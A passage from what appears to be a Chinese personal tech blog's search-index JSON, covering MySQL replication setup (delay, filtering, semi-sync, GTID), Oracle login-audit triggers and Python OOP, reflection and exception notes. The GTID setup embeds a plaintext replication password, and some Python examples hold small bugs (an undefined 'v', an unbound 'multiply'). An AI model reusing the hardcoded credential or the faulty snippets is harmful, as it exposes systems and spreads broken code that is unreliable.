如果主库的并发事务很多和大事务，都会造成从库延时 多(sql)线程复制，有局限性，针对不同库的事务来进行并发 ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:11:1","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.8. 延迟同步(高级) ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:12:0","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.8.1. 逻辑损坏 延迟从库：从库落后于主库一段时间 SQL线程延时，数据已经写入到relaylog，SQL线程慢点执行 -- 从库执行 mysql\u003e stop slave ; mysql\u003e CHANGE MASTER TO MASTER_DELAY = 3600; -- 建议3-6小时 mysql\u003e start slave ; 案例: 主库误操作，删库 停止主库业务 立即停止从库SQL线程 stop slave sql_thread; 手工模拟sql线程工作，并截止到误操作之前 读取relay-log.info,获取到上次执行到的位置,作为继续执行relay-log的起点，分析relay-log内容，获取到误操作的位置点，截取这段日志，恢复到从库 找到起点位置show slave status\\G,Relay_Log_file:db01-relay-bin.000002;Relay_Log_Pos:283 找到误删除的位置，show relaylog events in 'db01-relay-bin.000002',找到误删行的Pos值 截取同步日志 mysqlbinlog --start-position=283 --stop-position=693 db01-relay-bin.000002 \u003e relay.sql 恢复relaylog 切换从库为主库 ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:12:1","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.9. 过滤复制 从库只想复制主库的那些库 ## 控制 my.cnf (不建议在主库进行设置,建议在从库进行设置) ## 白名单(在此当中的才会复制) ## replicate_do_db = test --replicate-do-db = test # replicate_do_table = test.t1 --replicate-do-table = test.t1 # replicate_wild_do_table = test.t% --replicate-wild-do-table = test.t% ## 黑名单(在此中的将不会复制) # replicate_ignore_db = test --replicate-ignore-db = test # replicate_ignore_table = test.t1 --replicate-ignore-table = test.t1 # replicate_wild_ignore_table = test.t% --replicate-wild-ignore-table = test.t% ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:13:0","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.10. 半同步复制 尽可能保证主从数据一致性问题，牺牲主库一定的业务性能。实现过程，保证IO线程将日志从TCP/IP缓存，写入到relaylog才会返回ACK给主库。因此回阻塞主库的commit操作，这里会有个超时时间，10秒，如果从库还没有返回ACK，将会强制切换为一部复制过程。 -- 主执行 加载插件(默认就有该组建) INSTALL PLUGIN rpl_semi_sync_master SONAME 'semisync_master.so'; -- 从执行 加载插件(默认就有该组建) mysql\u003e INSTALL PLUGIN rpl_semi_sync_slave SONAME 'semisync_slave.so'; -- 查看是否加载成功 mysql\u003e show plugins; -- 主启动 mysql\u003e SET GLOBAL rpl_semi_sync_master_enabled = 1; -- 从启动 mysql\u003e SET GLOBAL rpl_semi_sync_slave_enabled = 1; -- 重启从库上的IO线程 mysql\u003e stop slave io_thread; mysql\u003e start slave io_thread; -- 查看主/备是否在运行 mysql\u003e show status like 'Rpl_semi_sync_master_status'; mysql\u003e show status like 'Rpl_semi_sync_slave_status'; --- 默认情况下,到达10秒还没有返回ack,从中关系自动切换为普通复制 rpl_semi_sync_master_timeout | 10000 ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:14:0","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.11. 主从复制GTID(5.6以上才有) 对于二进制日志中，每提交的一个事务都有一个全局的唯一编号，多主从一样，全局唯一，在处理恢复的时候，就可以只读取缺失的GIID事务 GTID == source_id == transaction_id 什么是server_id source_id 也叫server_uuid，默认是在数据库第一次启动时自动生成(/pathto/data/auto.cnf),手动删除后重启数据库可重新生成. GTID 复制要求必须是连续性事务 ## 启用GTID,不启用则为普通复制 gtid-mode=on ## 强制GTID的一致性 enforce-gtid-consistency=true ## slave 强制刷新从库的二进制日志 log-slave-updates=1 ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:15:0","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.11.1. GTID 从库误写入操作处理 注入空事务的方法: mysql\u003e stop slave; mysql\u003e set gtid_next='xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx:2'; --gtid_next 为slave sql thread 报错的GTID，或者是想要跳过的gtid mysql\u003e begin;commit; mysql\u003e set gtid_next='AUTOMATIC'; mysql\u003e start slave 最好的解决方案是：重新构建主从环境 ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:15:1","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.11.2. 构建一主2从的GTID的复制环境 -- 主库创建复制用户 $\u003e reset master; $\u003e grant replication slave on *.* to repl@'10.0.2.%' identified by 'gC74lgK9sSkzwBbrztd3'; $\u003e flush privileges; -- 从库连接 $\u003e reset master; mysql\u003e change master to MASTER_HOST='10.0.2.25', MASTER_USER='repl', MASTER_PASSWORD='gC74lgK9sSkzwBbrztd3', MASTER_PORT=3307, MASTER_AUTO_POSITION=1; $\u003e show slave status\\G -- 以下值，正常情况下应该和主库`show master status`的Executed_Gtid_Set值相同，如果不同则可能从库已经产生了写入 -- 接收到的 Retrieved_Gtid_set: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx:1 -- 已经执行的 Executed_Gtid_Set: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx:1 ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:15:2","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.12. 基本的复制主从结构 ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:16:0","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.12.1. 一主一从 graph TD; 主节点 --\u003e 从节点 graph TD; 主节点 --\u003e 从节点 ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:16:1","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.12.2. 一主多从 graph TD; 主节点 --\u003e 从节点1 主节点 --\u003e 从节点2 主节点 --\u003e 从节点3 graph TD; 主节点 --\u003e 从节点1 主节点 --\u003e 从节点2 主节点 --\u003e 从节点3 ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:16:2","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.12.3. 多级主从 graph TD; 主节点 --\u003e|全复制| 子主节点 subgraph '' 子主节点 --\u003e|分段复制| 子从节点1 子主节点 --\u003e|分段复制| 子从节点2 子主节点 --\u003e|分段复制| 子从节点3 end graph TD; 主节点 --\u003e|全复制| 子主节点 subgraph '' 子主节点 --\u003e|分段复制| 子从节点1 子主节点 --\u003e|分段复制| 子从节点2 子主节点 --\u003e|分段复制| 子从节点3 end ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:16:3","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.12.4. 双主 graph TD; 主节点 --\u003e|全复制| 子主节点 子主节点 --\u003e|全复制| 主节点 graph TD; 主节点 --\u003e|全复制| 子主节点 子主节点 --\u003e|全复制| 主节点 ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:16:4","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.13. 高性能架构 读写分离中间件–Mysql proxy(atlas,mysql router,proxySQL(percona),maxscale)、amoeba(taobao)、xx-dbproxy 自动判断前端sql(select、update)，实现读写分离 分库分表—cobar、Mycat,自主研发等。 ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:17:0","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"4.14. 高可用架构 单活: 主机宕机后需要手动切换 多活: 主机宕机不需要切换 单活:MMM架构 – mysql – mmm (google) 单活:MHA架构 – mysql-master-ha (日本DeNa) 多活:MGR(组复制) - 5.7 新特性 MySQL Group replication(5.7.17+) –\u003e Innodb Cluster 多活: MariaDB Galera Cluster架构， PXC(Percona XtraDB Cluster)、MySQL Cluster 架构 ","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:18:0","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","那些有用没用的"],"content":"Oracle 创建登录和退出的触发器","date":"2022-06-24","objectID":"/posts/other/%E5%88%9B%E5%BB%BA%E7%99%BB%E5%BD%95%E5%92%8C%E9%80%80%E5%87%BA%E7%9A%84%E8%A7%A6%E5%8F%91%E5%99%A8/","tags":["linux","解决方案","oracle"],"title":"Oracle创建登录和退出的触发器","uri":"/posts/other/%E5%88%9B%E5%BB%BA%E7%99%BB%E5%BD%95%E5%92%8C%E9%80%80%E5%87%BA%E7%9A%84%E8%A7%A6%E5%8F%91%E5%99%A8/"},{"categories":["linux","那些有用没用的"],"content":"创建触发记录表 create table log_table( username varchar2(20 ), logon_time date, logoff_time date, address varchar2(20 ) ); ","date":"2022-06-24","objectID":"/posts/other/%E5%88%9B%E5%BB%BA%E7%99%BB%E5%BD%95%E5%92%8C%E9%80%80%E5%87%BA%E7%9A%84%E8%A7%A6%E5%8F%91%E5%99%A8/:1:0","tags":["linux","解决方案","oracle"],"title":"Oracle创建登录和退出的触发器","uri":"/posts/other/%E5%88%9B%E5%BB%BA%E7%99%BB%E5%BD%95%E5%92%8C%E9%80%80%E5%87%BA%E7%9A%84%E8%A7%A6%E5%8F%91%E5%99%A8/"},{"categories":["linux","那些有用没用的"],"content":"登录触发器 create or replace trigger tr_logon after logon on DATABASE begin INSERT INTO log_table(username,logon_time,address) values(ora_login_user, SYSDATE,ora_client_ip_address); end; / ","date":"2022-06-24","objectID":"/posts/other/%E5%88%9B%E5%BB%BA%E7%99%BB%E5%BD%95%E5%92%8C%E9%80%80%E5%87%BA%E7%9A%84%E8%A7%A6%E5%8F%91%E5%99%A8/:2:0","tags":["linux","解决方案","oracle"],"title":"Oracle创建登录和退出的触发器","uri":"/posts/other/%E5%88%9B%E5%BB%BA%E7%99%BB%E5%BD%95%E5%92%8C%E9%80%80%E5%87%BA%E7%9A%84%E8%A7%A6%E5%8F%91%E5%99%A8/"},{"categories":["linux","那些有用没用的"],"content":"退出触发器 create or replace trigger tr_logoff before logoff on database begin INSERT INTO log_table(username,logoff_time,address) values(ora_login_user, SYSDATE,ora_client_ip_address); end; / ","date":"2022-06-24","objectID":"/posts/other/%E5%88%9B%E5%BB%BA%E7%99%BB%E5%BD%95%E5%92%8C%E9%80%80%E5%87%BA%E7%9A%84%E8%A7%A6%E5%8F%91%E5%99%A8/:3:0","tags":["linux","解决方案","oracle"],"title":"Oracle创建登录和退出的触发器","uri":"/posts/other/%E5%88%9B%E5%BB%BA%E7%99%BB%E5%BD%95%E5%92%8C%E9%80%80%E5%87%BA%E7%9A%84%E8%A7%A6%E5%8F%91%E5%99%A8/"},{"categories":["linux","运维记事"],"content":"函数相关","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/","tags":["linux","python"],"title":"Python 函数相关(二)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/"},{"categories":["linux","运维记事"],"content":"1. 多态 同一个方法在不同的类中最终呈现出不同的效果，即为多态。 class demo1(object): def __init__(self,width,height): self.width = width self.height = height def getArea(self): area=self.width* self.height / 2 return area class demo2(object): def __init__(self,size): self.size = size def getArea(self): # 同一个方法在不同的类中最终呈现出不同的效果，即为多态 area = self.size * self.size return area a=demo1(5,5) print(a.getArea()) b=demo2(5) print(v.getArea()) ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/:1:0","tags":["linux","python"],"title":"Python 函数相关(二)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/"},{"categories":["linux","运维记事"],"content":"2. 继承 重构 重写 重载 Python的继承没有类似java中的extends关键字，当Python中一个类需要继承另一个类的时候,只需要将被继承的类通过变量形式传递给新类，即可完成继承 Python还可以实现多继承，将多个被继承类通过变量形式传递给新类，即可完成多继承 ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/:2:0","tags":["linux","python"],"title":"Python 函数相关(二)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/"},{"categories":["linux","运维记事"],"content":"2.1. 重写 方法名相同，参数相同，内容不同 ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/:3:0","tags":["linux","python"],"title":"Python 函数相关(二)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/"},{"categories":["linux","运维记事"],"content":"2.2. 重载 方法名字相同，参数不同 ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/:4:0","tags":["linux","python"],"title":"Python 函数相关(二)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/"},{"categories":["linux","运维记事"],"content":"3. 继承查询 Python2 经典类都是按照深度类查询(及深度优先搜索算法) Python2 新式类都是按照广度类查询(及广度优先搜索算法) Python3 新式类和经典类都是按照广度类查询 ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/:5:0","tags":["linux","python"],"title":"Python 函数相关(二)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/"},{"categories":["linux","运维记事"],"content":"4. 示例： 只能说是可以用，但还是有很大部分的疑问，只能用仅剩的一点java记忆强行解释了 class Farm(object): def __init__(self,name,addr): self.name = name self.addr = addr def Recruit(self,worker_obj): pass def BuyAnimal(self,animal_obj): pass def SellAnimal(self,animal_obj): pass def Resign(self,worker_obj): pass class FarmMember(Farm): def __init__(self,name,addr): # 这种也应算重载 super(FarmMember,self).__init__(name,addr) self.farmers = [] def Recruit(self, farmer_obj): # 重写 print(\"为农场申请了一个管理员 %s \" % farmer_obj.name) self.farmers.append(farmer_obj) def Info(self): pass class Manager(FarmMember): def __init__(self,name,addr,age,sex): # 重载 super(Manager, self).__init__(name, addr) self.age = age self.sex = sex self.workers = [] def Info(self): #重写 print(''' --- 管理员 Info %s --- 名字 : %s 年龄 : %s 性别 : %s 地址 : %s '''%(self.name,self.name,self.age,self.sex,self.addr)) def Recruit(self,worker_obj): #重写 print(\"管理员招聘了一个名叫 %s 的员工 \" % worker_obj.name) self.workers.append(worker_obj) def BuyAnimal(self,animal_obj): #重写 print(\"管理员购买了 %s 个 %s , 花费了 %s 元\"%(animal_obj.num, animal_obj.name ,(animal_obj.num * animal_obj.price))) def SellAnimal(self,animal_obj): #重写 print(\"管理员出售了%s 个 %s, 卖了 %s 元\" % (animal_obj.num, animal_obj.name,(animal_obj.num * animal_obj.price))) def Resign(self, worker_obj): #重写 print(\"管理员辞退了 %s \" % worker_obj.name) self.workers.remove(worker_obj) class Home(object): def myHome(self): print(\"我的家在 %s \" % self.addr) class Worker(Manager, Home): def __init__(self,name,addr,age,sex,id): # 广度查询 Manager --\u003e Home --\u003e Farm super(Worker,self).__init__(name, addr, age, sex) self.id = id def Info(self): # 重写 print(''' --- 工人信息 %s --- 编号： %s 名字： %s 性别： %s 年龄： %s 家庭地址： %s ''' % (self.name,self.id,self.name,self.sex,self.age,self.addr)) class Animals(Manager, FarmMember): def __init__(self,name,num,price): # 重载 self.name = name self.num = num self.price = price def Info(self): # 重写 print(''' --- 动物信息 %s 名字: %s 数量：%s 单价：%s ''' %(self.name,self.name,self.num,self.price)) # 实例化农场 fmmr = FarmMember(\"草原1号\", \"山咔咔\") # 实例化管理员 fr = Manager(\"张三\", \"重庆\", \"33\", \"男\") fmmr.Recruit(fr) # 申请一个管理 fr.Info() #实例化普通员工 wr1 = Worker(\"李四\",\"北京\",\"21\",\"男\",1001) wr1.Info() wr2 = Worker(\"王五\",\"上海\",\"22\",\"男\",1002) wr2.Info() wr3 = Worker(\"赵六\", \"广州\", \"22\", \"男\", 1003) wr3.Info() wr3.myHome() # 招聘一个普通员工 fr.Recruit(wr1) fr.Recruit(wr2) fr.Recruit(wr3) # 实例化动物 dw1 = Animals(\"小鸡\",12,6.7) dw2 = Animals(\"小鸭\",22,4.5) fr.BuyAnimal(dw1) fr.SellAnimal(dw2) fr.Resign(wr2) print(\"%s 管理员下的工人还有 \" % fr.name) for i in fr.workers: print(i.name) ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/:6:0","tags":["linux","python"],"title":"Python 函数相关(二)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/"},{"categories":["linux","运维记事"],"content":"5. 类方法、静态方法、属性方法、property 静态方法： 通过修饰器@staticmethod来进行修饰的方法，静态方法不需要定义参数，因此在静态方法中引用类属性的话，必须通过类对象来引用(实际上不可直接访问类和实例中的任何属性和方法)。可通过实例对象或类对象进行访问。 类方法： 是类对象所拥有的方法，需要用修饰器@classmethod来标识其为类方法，第一个参数必须是类对象，一般以cls作为第一个参数。可通过实例对象或类对象进行访问。类方法只能访问类变量，不可访问实例(self)变量。 属性方法： 通过@property来进行修饰，可以将类方法转换为属性对象，使其调用时候可以直接通过实例对象像调用类属性一样进行调用，其总共包含三种访问形式@property, @方法名.setter, @方法名.deleter。一般用来处理私有变量。和java的getter、setter方法有点类似(吧？个人感觉没什么卵用的样子，可能是没有用到) property： 大部分的解释是函数的作用是在新式类中返回属性值,个人还并不是特别理解这个的意思，不过用java来对比的话,就是getter、setter的升级版。property总共包含4个参数: 第一个参数是方法名，在调用(类/实例)对象.属性自动触发执行方法; 第二个参数是方法名，在调用(类/实例)对象.属性=xx时自动触发执行方法; 第三个参数是方法名，在调用del (类/实例)对象.属性时自动触发执行方法; 第四个参数是字符串，在调用实例对象.属性.__doc__,此参数是该属性的描述信息; 示例： class FarmMember(object): addr = \"xxx.xxx\" def __init__(self, title): self.title = title self.__ID = None self.__systemID = None @classmethod def classGetAddr(cls, param): print(\"动态方法: Farm 地址: %s 外部传递参数: %s\" % (cls.addr, param)) @classmethod def classUpdateAddr(cls, param): cls.addr = \"---.---\" cls.classGetAddr(param) @staticmethod def staticGetAddr(param): print(\"静态方法: Farm 地址: %s 外部传递参数: %s \" % ( FarmMember.addr, param)) @property def farmID(self): \"\"\"getFarmID(self)\"\"\" print('@property: addr = %s ,farmID = %s' % (self.addr,self.__ID)) @farmID.setter def farmID(self,value): \"\"\"setFarmID(self,value)\"\"\" print(\"@farmID.setter : addr = %s, farmID = %s\" % (self.addr, value)) self.__ID = value @farmID.deleter def farmID(self): print(\"@farmID.deleter : addr = %s, farmID = %s\" % (self.addr,self.__ID)) del self.__ID def __getSystemID(self): print(\"getSystemID: self.__systemID = %s\" % self.__systemID) def __setSystemID(self, value): \"\"\" 必须传递两个参数\"\"\" print(\"setSystemID: self.__systemID = %s, value = %s\" %(self.__systemID,value)) self.__systemID = value def __delSystemID(self): print(\"delSystemID: self.__systemID = %s\"%self.__systemID) del self.__systemID systemId = property(__getSystemID, __setSystemID, __delSystemID,\"systemID descript\") fr = FarmMember(\"fr title\") fr.classGetAddr(\"实例对象访问\") FarmMember.classGetAddr(\"类对象访问\") print(\"---------\") fr.staticGetAddr(\"实例对象访问\") FarmMember.staticGetAddr(\"类对象访问\") print(\"---------\") fr.classUpdateAddr(\"类对象修改类变量\") print(\"---------\") # 自动执行@property修饰的farmID方法,并返回函数结果 fr.farmID # 自动执行 @farmID.setter修饰的farmID方法,并将1001赋值给方法的参数 fr.farmID = \"1001\" # 自动执行@farmID.deleter修饰的farmID方法 del fr.farmID print(\"---------\") fr.systemId fr.systemId = \"900001\" del fr.systemId print(FarmMember.systemId.__doc__) ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/:7:0","tags":["linux","python"],"title":"Python 函数相关(二)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/"},{"categories":["linux","运维记事"],"content":"6. metaclass 这个东西个人感觉又有点像注入的感觉吧，他的作用是在某个类中定义当前类按照什么方式来被初始化(或者创建)，大概就是这个意思吧 ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/:8:0","tags":["linux","python"],"title":"Python 函数相关(二)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/"},{"categories":["linux","运维记事"],"content":"7. 反射 通过字符串映射或修改程序运行时的状态、属性、方法, 有以下4个方法 getattr(object, str, default=None) 得到对象中字符串表示的方法的内存地址 hasattr(object, str): 判断一个对象中是否包含字符串表示的方法 setattr(object, str, func): 为类添加一个新的函数(或变量) object.str = func delattr(class_object,str): 删除类中表示字符串的变量(或函数),等价于 del class_object.str 示例代码: class Judge(object): def __init__(self, x, y): self.x = x self.y = y def add(self): print(\"x + y = %s\" % (self.x + self.y)) def sub(self): print(\"x - y = %s\" % (self.x - self.y)) def multiply(self): print(\"x * y = %s\" % (self.x * self.y)) m = Judge(100, 200) cho = input(\"\u003e: \").strip() if hasattr(m, cho): if cho == \"sub\": # 这个方法实际上是用于删除属性变量的，如果要删除函数，必须使用类对象，而不是类实例对象 delattr(Judge, cho) # delattr(m, cho) # AttributeError else: func = getattr(m, cho) # 函数及变量，因此如果此处输入的cho为类变量，则将直接返回变量值 func() else: if cho == \"mul\": setattr(m, cho, multiply) # m.mul(m) # 这个被调用的方法是cho的值,可以使用下面的方法进行调用 func = getattr(m, cho) func(m) else: print(\"input error \") print(hasattr(m, cho)) ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/:9:0","tags":["linux","python"],"title":"Python 函数相关(二)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/"},{"categories":["linux","运维记事"],"content":"8. 异常处理 常见异常 异常名称 描述 BaseException 所有异常的基类 SystemExit 解释器请求退出 KeyboardInterrupt 用户中断执行(通常是输入^C) Exception 常规错误的基类 StopIteration 迭代器没有更多的值 GeneratorExit 生成器(generator)发生异常来通知退出 StandardError 所有的内建标准异常的基类 ArithmeticError 所有数值计算错误的基类 FloatingPointError 浮点计算错误 OverflowError 数值运算超出最大限制 ZeroDivisionError 除(或取模)零 (所有数据类型) AssertionError 断言语句失败 AttributeError 对象没有这个属性 EOFError 没有内建输入,到达EOF 标记 EnvironmentError 操作系统错误的基类 IOError 输入/输出操作失败 OSError 操作系统错误 WindowsError 系统调用失败 ImportError 导入模块/对象失败 LookupError 无效数据查询的基类 IndexError 序列中没有此索引(index) KeyError 映射中没有这个键 MemoryError 内存溢出错误(对于Python 解释器不是致命的) NameError 未声明/初始化对象 (没有属性) UnboundLocalError 访问未初始化的本地变量 ReferenceError 弱引用(Weak reference)试图访问已经垃圾回收了的对象 RuntimeError 一般的运行时错误 NotImplementedError 尚未实现的方法 SyntaxError Python 语法错误 IndentationError 缩进错误 TabError Tab 和空格混用 SystemError 一般的解释器系统错误 TypeError 对类型无效的操作 ValueError 传入无效的参数 UnicodeError Unicode 相关的错误 UnicodeDecodeError Unicode 解码时的错误 UnicodeEncodeError Unicode 编码时错误 UnicodeTranslateError Unicode 转换时错误 Warning 警告的基类 DeprecationWarning 关于被弃用的特征的警告 FutureWarning 关于构造将来语义会有改变的警告 OverflowWarning 旧的关于自动提升为长整型(long)的警告 PendingDeprecationWarning 关于特性将会被废弃的警告 RuntimeWarning 可疑的运行时行为(runtime behavior)的警告 SyntaxWarning 可疑的语法的警告 UserWarning 用户代码生成的警告 示例 1 : try: print(1/0) except ZeroDivisionError as e: print(\"不能除以0\",e) except Exception as e : print(e) else: print(\"当没有错误的时候执行这个位置。。。\") finally: print(\"finally....\") 示例 2 : class customException(Exception): '''自定义异常''' def __init__(self,msg): self.message = msg try: raise customException(\"这是一个手动抛出的异常\") except customException as e: print(e) ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/:10:0","tags":["linux","python"],"title":"Python 函数相关(二)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/"},{"categories":["linux","运维记事"],"content":"9. 断言 assert 语法格式: assert condition,str 用来判断条件真假,为真执行下一步，为假抛出AssertionError 异常 其功能大致相当于 : if not condition: raise AssertionError() 示例 : \u003e\u003e\u003e assert True \u003e\u003e\u003e assert False,\"Error info\" Traceback (most recent call last): File \"\u003cstdin\u003e\", line 1, in \u003cmodule\u003e AssertionError: Error info \u003e\u003e\u003e assert 1+1 == 3,\"1 + 1 不等于 3 \" Traceback (most recent call last): File \"\u003cstdin\u003e\", line 1, in \u003cmodule\u003e AssertionError: 1 + 1 不等于 3 ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/:11:0","tags":["linux","python"],"title":"Python 函数相关(二)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/"},{"categories":["linux","运维记事"],"content":"函数相关","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/","tags":["linux","python"],"title":"Python 函数相关(一)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","运维记事"],"content":"1. 函数参数释义 必选参数 函数定义时,定义了接收变量,那么在函数调用时就必须传递该参数值 默认参数 在函数定义时,可为需要接受值的参数设置一个默认值,若函数调用时,该参数未传入值时,则使用默认值 可变参数 *args(关键字参数) : 可向函数中传递0个或多个参数(类似String…args),内部变量若为*args,结果将为元组,独立值将会顺序接收 **kwargs(命名关键字参数) : 可向函数中以键值对的形式传递0个或多个参数,内部变量若为**kwargs,结果将为字典,独立值将会顺序接收 组合参数 用必选参数、默认参数、可变参数、关键字参数和命名关键字参数，这5种参数可组合使用,但参数传递顺序必须是: 必选参数、默认参数、可变参数、命名关键字参数和关键字参数。 ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/:1:0","tags":["linux","python"],"title":"Python 函数相关(一)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","运维记事"],"content":"2. 函数即\"变量\" ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/:2:0","tags":["linux","python"],"title":"Python 函数相关(一)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","运维记事"],"content":"3. 高阶函数 一个变量可以指向函数，函数的参数能接收变量，那么一个函数就可以接收另一个函数作为参数，这种函数就称之为高阶函数 ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/:3:0","tags":["linux","python"],"title":"Python 函数相关(一)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","运维记事"],"content":"4. 嵌套函数 一个函数中可以包含另一个函数 ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/:4:0","tags":["linux","python"],"title":"Python 函数相关(一)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","运维记事"],"content":"5. 装饰器 示例代码1: import time def wrapper(func): def demo(*args, **kwargs): print(\"装饰器函数参数调用层 : \", time.time()) res = func(*args, **kwargs) print(\"装饰器函数调用函数参数 : \", args, kwargs) return res return demo @wrapper # 注入? # 函数即变量 #@test == { # test2=test(test1); #调用 # test2(11, a=\"01\") #} == { test1 = test(test1) } def calc(x, 